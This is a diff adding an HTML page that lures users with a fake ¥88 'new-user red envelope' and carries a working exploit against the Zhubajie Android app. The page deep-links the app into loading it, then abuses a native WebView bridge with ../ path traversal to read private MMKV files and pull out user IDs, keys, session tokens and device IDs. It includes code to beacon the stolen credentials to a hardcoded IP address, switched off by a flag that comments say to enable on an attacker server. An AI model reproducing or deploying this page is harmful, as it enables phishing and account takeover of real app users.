@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no,maximum-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>新人专享红包</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;background:#f6f7f9;color:#222;min-height:100vh}
+.hd{background:linear-gradient(160deg,#ff5a2b,#ff2e4d);padding:34px 20px 74px;text-align:center;color:#fff}
+.hd h1{font-size:24px;font-weight:800;letter-spacing:.5px}
+.hd p{margin-top:8px;font-size:13px;opacity:.92}
+.card{width:92%;max-width:420px;margin:-52px auto 0;background:#fff;border-radius:14px;box-shadow:0 8px 28px rgba(0,0,0,.10);padding:22px 18px 18px;text-align:center}
+.amt{font-size:54px;font-weight:800;color:#ff3b30;line-height:1.1}
+.amt small{font-size:22px;font-weight:700}
+.tip{margin:10px 0 4px;font-size:12.5px;color:#999}
+.sub{margin-top:6px;font-size:13px;color:#666}
+.btn{display:block;width:100%;margin-top:20px;padding:15px 0;border:0;border-radius:999px;background:linear-gradient(90deg,#ff5a2b,#ff2e4d);color:#fff;font-size:17px;font-weight:700;letter-spacing:1px;box-shadow:0 6px 18px rgba(255,60,60,.35)}
+.btn[disabled]{opacity:.6}
+.spin{display:none;margin-top:14px;font-size:13px;color:#ff3b30}
+.spin.on{display:block}
+.ok-ico{display:none;color:#18a058;font-size:13px;margin-top:10px;font-weight:600}
+.ok-ico.on{display:block}
+
+#mask{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:99}
+#box{display:none;position:fixed;left:8px;right:8px;top:14px;bottom:14px;flex-direction:column;background:#fff;border-radius:10px;z-index:100;box-shadow:0 12px 40px rgba(0,0,0,.4)}
+#box.on{display:flex}
+#box .bar{padding:10px 12px;background:#111;color:#fff;font-size:13px;font-weight:600;border-radius:10px 10px 0 0;display:flex;justify-content:space-between;align-items:center}
+#box .bar span.r{font-weight:400;opacity:.65;font-size:11px}
+#box .bd{padding:10px 12px;overflow:auto;flex:1;-webkit-overflow-scrolling:touch}
+.field{margin-bottom:9px}
+.field .k{font-size:11px;color:#c00;font-weight:700;letter-spacing:.4px;margin-bottom:3px}
+.field .v{font-family:Consolas,Menlo,monospace;font-size:11px;line-height:1.55;background:#f5f6f8;border-left:3px solid #c00;padding:6px 8px;border-radius:3px;color:#111;word-break:break-all;white-space:pre-wrap;user-select:text;-webkit-user-select:text}
+.field.empty .v{background:#fafafa;border-left-color:#ccc;color:#aaa}
+#box .ft{padding:9px 12px;border-top:1px solid #eee;display:flex;gap:8px;justify-content:flex-end}
+#box .ft button{padding:8px 15px;border:1px solid #ddd;background:#f7f7f7;border-radius:6px;font-size:13px}
+#jump{display:none;margin-top:12px;font-size:13px;color:#666;line-height:1.7}
+#jump.on{display:block}
+#jump a{color:#ff3b30;font-weight:600}
+</style></head>
+<body>
+<div class="hd">
+  <h1>恭喜你被选中</h1>
+  <p>新人专享福利 · 限时领取</p>
+</div>
+<div class="card">
+  <div class="amt"><small>¥</small>88<span style="font-size:24px">.00</span></div>
+  <div class="tip">红包有效期 24 小时</div>
+  <button class="btn" id="btn" onclick="claim()">立即领取</button>
+  <div class="spin" id="spin">正在领取，请稍候…</div>
+  <div class="ok-ico" id="okico">红包已到账</div>
+  <div class="sub" id="sub"></div>
+  <div id="jump"></div>
+</div>
+
+<div id="mask" onclick="closeBox()"></div>
+<div id="box">
+  <div class="bar"><span>已获取数据</span><span class="r" id="cnt"></span></div>
+  <div class="bd" id="bd"></div>
+  <div class="ft"><button onclick="copyAll()">复制全部</button><button onclick="closeBox()">关闭</button></div>
+</div>
+
+<script>
+/* =========================================================================
+   红包页（双模）
+   浏览器打开：点"立即领取" → 深链拉起猪八戒App，并让App重新加载本页
+   App内打开： 具备反射桥 → 直接读取私有目录文件并弹窗展示
+   ========================================================================= */
+
+/* 部署到攻击者服务器时置 true，把结果外传 */
+var EXFIL = false;
+/* GitHub 备用版：默认只屏幕回显，不外传。需要外传时把 EXFIL 改 true（不建议在公开页上开启） */
+var COLLECT_URL = 'https://43.136.59.252/beacon';
+
+/* App内自动弹出（浏览器跳转进App后无需二次点击） */
+var AUTO_RUN_IN_APP = true;
+
+/* 深链：拉起App的入口 */
+var SCHEME = 'zbj://zbj.com/openNewPage?url=';
+
+/* 读取 App 私有目录（key 未做路径校验，../ 穿越） */
+var UP = '../../../';
+var FILES = [
+  { id:'mmkv', key: UP+'files/mmkv/mmkv.default' },
+  { id:'djx',  key: UP+'files/mmkv/DJXSdk-token' },
+  { id:'sp',   key: UP+'files/mmkv/DJXSdkSp' }
+];
+
+function esc(s){ return (''+s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function hasBridge(){ try{ return (typeof Android!=='undefined') && !!Android.zbjCallNative; }catch(e){ return false; } }
+var IN_APP = hasBridge();
+
+function beacon(t,d){ if(!EXFIL) return; try{ new Image().src = COLLECT_URL + '?t=' + encodeURIComponent(t) + '&d=' + encodeURIComponent(''+(d||'')); }catch(e){} }
+
+/* ---------- MMKV 取值：先按 varint 长度精确取，失败再回退 ---------- */
+function mmkvVal(raw, key){
+  if(!raw) return null;
+  var best = null, i = raw.indexOf(key);
+  while(i >= 0){
+    var prev = i > 0 ? raw.charCodeAt(i-1) : 0;
+    if(!(prev >= 0x20 && prev <= 0x7e)){
+      var p = i + key.length;
+      var L = raw.charCodeAt(p);
+      if(L > 0 && L < 0x80){
+        var v = raw.substr(p+1, L);
+        if(v.length === L && L > 0){ best = v; i = raw.indexOf(key, i+key.length); continue; }
+      }
+      var m = raw.substr(p, 1200).match(/[A-Za-z0-9][\x21-\x7e]{0,}/);
+      if(m && m[0].length > 0) best = m[0];
+    }
+    i = raw.indexOf(key, i + key.length);
+  }
+  return best;
+}
+function clean(s){ return s ? s.replace(/[^\x20-\x7e]/g,'').replace(/\s+$/,'') : null; }
+function rx(s, re){ var m = s ? String(s).match(re) : null; return m ? m[0] : null; }
+
+/* ---------- dk = Base64(设备信息 JSON)，与 BuyerDeviceKey 同构 ---------- */
+function uaInfo(){
+  var ua = navigator.userAgent || '';
+  var m = ua.match(/Android\s+([\d.]+);\s*([^;)]+?)\s*(?:Build|;|\))/);
+  var API = {'4.4':19,'5':21,'5.1':22,'6':23,'7':24,'7.1':25,'8':26,'8.1':27,'9':28,'10':29,'11':30,'12':31,'12.1':32,'13':33,'14':34,'15':35,'16':36};
+  return { model: m ? m[2].trim() : '', api: m ? (API[m[1]] || 29) : 29 };
+}
+function buildDk(did){
+  var ua = uaInfo();
+  var dev = {
+    baidu_userid: did || '',
+    brandModel: ua.model,
+    client_type: 1,
+    client_version: '9.5.11',
+    device_key: did || '',
+    imei: '',
+    phone_os_version: ua.api,
+    phone_type: '1',
+    soft_from: ''
+  };
+  try { return btoa(JSON.stringify(dev)); } catch(e){ return ''; }
+}
+
+var store = {};
+function rbRead(id, key){
+  return new Promise(function(resolve){
+    var cb = 'rbcb_'+id+'_'+Math.floor(Math.random()*1e6);
+    window[cb] = function(res){ store[id] = (res && res.success) ? String(res.data) : null; resolve(store[id]); };
+    try{
+      Android.zbjCallNative(JSON.stringify({
+        functionName:'ReadFile',
+        params: JSON.stringify({ key:key, dir_name:'hb', callback:cb })
+      }));
+    }catch(e){ resolve(null); }
+    setTimeout(function(){ if(store[id]===undefined) resolve(null); }, 4000);
+  });
+}
+
+/* ---------- 入口 ---------- */
+var busy = false, LAST = '';
+function claim(){
+  beacon('tap', IN_APP ? 'in-app' : 'browser');
+  if(IN_APP){ startRead(); return; }
+  jumpToApp();
+}
+
+/* 浏览器分支：深链拉起 App，并让 App 重新加载本页（自引用） */
+function jumpToApp(){
+  var self = location.href.split('#')[0];
+  var dl = SCHEME + encodeURIComponent(self);
+  document.getElementById('btn').disabled = true;
+  document.getElementById('btn').textContent = '正在打开猪八戒App…';
+  document.getElementById('spin').classList.add('on');
+  try{
+    var a = document.createElement('a');
+    a.href = dl; a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+  }catch(e){}
+  setTimeout(function(){ try{ location.href = dl; }catch(e){} }, 250);
+  setTimeout(function(){
+    if(document.hidden) return;
+    document.getElementById('spin').classList.remove('on');
+    document.getElementById('btn').disabled = false;
+    document.getElementById('btn').textContent = '立即领取';
+    var j = document.getElementById('jump');
+    j.innerHTML = '未自动打开？<a href="'+dl+'">点此手动打开猪八戒App</a>';
+    j.classList.add('on');
+  }, 1800);
+}
+
+/* App内分支：读取并弹窗 */
+function startRead(){
+  if(busy) return; busy = true;
+  document.getElementById('btn').disabled = true;
+  document.getElementById('btn').textContent = '领取中…';
+  document.getElementById('spin').classList.add('on');
+  var chain = Promise.resolve();
+  FILES.forEach(function(f){ chain = chain.then(function(){ return rbRead(f.id, f.key); }); });
+  chain.then(function(){ render(collect(), null); });
+}
+
+function collect(){
+  var mk = store.mmkv || '', dj = store.djx || '', sp = store.sp || '';
+  var r = {};
+  r.user_id  = rx(mmkvVal(mk,'user_id'), /\d{5,}/) || rx(mmkvVal(dj,'ouid'), /\d{5,}/);
+  r.user_key = clean(mmkvVal(mk,'user_key'));
+  r.token    = clean(mmkvVal(mk,'token')) || clean(mmkvVal(dj,'tk'));
+  r.device_id= clean(mmkvVal(sp,'did')) || clean(mmkvVal(dj,'did'));
+  r.uuid     = rx(sp, /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);
+  r.dk       = buildDk(r.device_id);
+  return r;
+}
+
+function render(r, err){
+  var bd = document.getElementById('bd');
+  if(err){
+    bd.innerHTML = '<div class="field empty"><div class="k">结果</div><div class="v">'+esc(err)+'</div></div>';
+  } else {
+    var order = ['user_id','user_key','token','device_id','uuid','dk'];
+    var h = '', cnt = 0;
+    order.forEach(function(k){
+      var v = r[k]; if(v) cnt++;
+      h += '<div class="field'+(v?'':' empty')+'"><div class="k">'+k+'</div><div class="v">'+esc(v||'(未获取)')+'</div></div>';
+    });
+    bd.innerHTML = h;
+    document.getElementById('cnt').textContent = cnt + ' 项';
+    LAST = order.map(function(k){ return k + '=' + (r[k]||''); }).join('\n');
+    beacon('cred', LAST);
+  }
+  document.getElementById('mask').style.display = 'block';
+  document.getElementById('box').classList.add('on');
+  document.getElementById('spin').classList.remove('on');
+  document.getElementById('btn').disabled = false;
+  document.getElementById('btn').textContent = '立即领取';
+  document.getElementById('okico').classList.add('on');
+  document.getElementById('sub').textContent = '红包 ¥88.00 已存入余额';
+  busy = false;
+}
+
+function closeBox(){
+  document.getElementById('mask').style.display = 'none';
+  document.getElementById('box').classList.remove('on');
+}
+function copyAll(){
+  try{
+    if(navigator.clipboard && navigator.clipboard.writeText){ navigator.clipboard.writeText(LAST); }
+    else { var ta = document.createElement('textarea'); ta.value = LAST; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); }
+    alert('已复制');
+  }catch(e){ alert('复制失败，请长按选择'); }
+}
+
+/* App内：自动弹出（浏览器跳进来后不用再点一次） */
+if(IN_APP && AUTO_RUN_IN_APP){ setTimeout(function(){ startRead(); }, 700); }
+</script>
+</body></html>
